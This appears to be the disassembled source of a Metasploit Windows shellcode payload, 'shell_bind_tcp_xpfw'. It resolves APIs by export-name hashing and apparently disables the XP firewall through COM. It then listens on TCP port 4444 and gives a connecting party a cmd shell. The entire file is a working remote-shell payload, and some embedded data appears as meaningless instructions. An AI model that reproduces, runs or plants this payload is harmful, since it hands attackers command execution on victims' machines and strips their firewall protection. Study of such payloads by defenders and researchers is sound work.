;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for shell_bind_tcp_xpfw (single)
;
; Authors: Lin0xx <lin0xx@metasploit.com>
; Size   : 529
;

call 0x5b
push ebx
push ebp
push esi
push edi
mov ebp,[esp+0x18]
mov eax,[ebp+0x3c]
mov edx,[ebp+eax+0x78]
add edx,ebp
mov ecx,[edx+0x18]
mov ebx,[edx+0x20]
add ebx,ebp
jecxz 0x52
dec ecx
mov esi,[ebx+ecx*4]
add esi,ebp
xor edi,edi
cld
xor eax,eax
lodsb
cmp al,ah
jz 0x37
ror edi,0xd
add edi,eax
jmp short 0x29
cmp edi,[esp+0x14]
jnz 0x1e
mov ebx,[edx+0x24]
add ebx,ebp
mov cx,[ebx+ecx*2]
mov ebx,[edx+0x1c]
add ebx,ebp
mov eax,[ebx+ecx*4]
add eax,ebp
jmp short 0x54
xor eax,eax
pop edi
pop esi
pop ebp
pop ebx
ret 0x8
pop esi
push byte +0x30
pop ecx
mov ebx,[fs:ecx]
mov ebx,[ebx+0xc]
mov ebx,[ebx+0x1c]
mov ebx,[ebx]
mov ebx,[ebx+0x8]
push ebx
push dword 0xec0e4e8e
call esi
mov edi,eax
sub esp,0x100
push edi
push esi
push ebx
mov ebp,esp
call 0xae
nop
add [eax],eax
add [esi+0xa4e71819],dh
sbb [eax-0x17],esi
in eax,0x49
xchg cl,[ecx-0x5c]
sbb dh,[eax-0x39]
movsb
lodsd
cs jmp 0xadf50a7c
retf
in eax,dx
cld
cmp edx,[edi+0x53]
xor bl,[edi+0x33]
xor al,[eax]
pop ebx
lea ecx,[ebx+0x20]
push ecx
call edi
mov edi,ebx
mov ebx,eax
lea esi,[ebp+0x14]
push byte +0x7
pop ecx
push ecx
push ebx
push dword [edi+ecx*4]
call near [ebp+0x4]
pop ecx
mov [esi+ecx*4],eax
loop 0xbf
sub esp,[edi]
push esp
push dword [edi]
call near [ebp+0x30]
xor eax,eax
push eax
push eax
push eax
push eax
inc eax
push eax
inc eax
push eax
call near [ebp+0x2c]
mov edi,eax
mov [ebp+0xc],edi
call 0xf2
dec edi
dec esp
inc ebp
xor esi,[edx]
add bh,bh
push ebp
or [ecx+0x1b6856c6],cl
push es
enter 0xff0d,0x55
add al,0x6a
add ch,[edx+0x0]
call eax
push esi
push dword 0x6e26c880
call near [ebp+0x4]
mov edi,eax
call 0x136
cmc
mov cl,[ecx+0x32cac4f7]
inc esi
mov [0xe506daec],al
adc [edx],ebx
repne inc edx
jmp 0x6e393178
fadd dword [eax-0x6c]
cmp bh,[ecx+0x9c0cc413]
aam 0x58
push eax
lea esi,[ebp-0x14]
push esi
push eax
push byte +0x1
push byte +0x0
add eax,byte +0x10
push eax
call edi
lea ecx,[ebp-0x20]
push ecx
mov edx,[ebp-0x14]
mov eax,[edx]
mov ecx,[ebp-0x14]
push ecx
mov edx,[eax+0x1c]
call edx
lea eax,[ebp-0x8]
push eax
mov ecx,[ebp-0x20]
mov edx,[ecx]
mov eax,[ebp-0x20]
push eax
mov ecx,[edx+0x1c]
call ecx
xor eax,eax
push eax
mov edx,[ebp-0x8]
mov eax,[edx]
mov ecx,[ebp-0x8]
push ecx
mov edx,[eax+0x24]
call edx
xor ebx,ebx
push ebx
push ebx
push dword 0x5c110002
mov eax,esp
push byte +0x10
push eax
mov edi,[ebp+0xc]
push edi
call near [ebp+0x24]
push ebx
push edi
call near [ebp+0x28]
push ebx
push esp
push edi
call near [ebp+0x20]
mov edi,eax
push dword 0x444d43
mov ebx,esp
xchg edi,edx
xor eax,eax
lea edi,[esp-0x54]
push byte +0x15
pop ecx
rep stosd
xchg edi,edx
sub esp,byte +0x54
mov byte [esp+0x10],0x44
mov word [esp+0x3c],0x101
mov [esp+0x48],edi
mov [esp+0x4c],edi
mov [esp+0x50],edi
lea eax,[esp+0x10]
push esp
push eax
push ecx
push ecx
push ecx
inc ecx
push ecx
dec ecx
push ecx
push ecx
push ebx
push ecx
push dword [ebp+0x0]
push dword 0x16b3fe72
call near [ebp+0x4]
call eax
mov esi,esp
push dword [ebp+0x0]
push dword 0xce05d9ad
call near [ebp+0x4]
mov ebx,eax
push byte -0x1
push dword [esi]
call ebx
push dword [ebp+0x0]
push dword 0x5f048af0
call near [ebp+0x4]
xor ebx,ebx
push ebx
call eax
